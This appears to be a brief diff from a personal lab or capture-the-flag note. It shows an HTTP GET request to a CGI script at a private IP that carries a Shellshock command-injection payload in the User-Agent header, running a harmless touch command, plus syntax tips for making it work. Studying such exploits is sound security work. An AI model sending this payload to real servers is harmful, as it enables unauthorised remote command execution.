@@ -1,0 +1,8 @@
+GET /intconf.cgi HTTP/1.1
+Host: 10.6.66.42
+Connection: close
+User-Agent: () { :;}; /bin/touch /tmp/hiii
+
+
+Note that over here, the space after the first { is very important. Because I wasn't using the space I spent so much time on this.
+HTTP/1.1 connections require a host always.
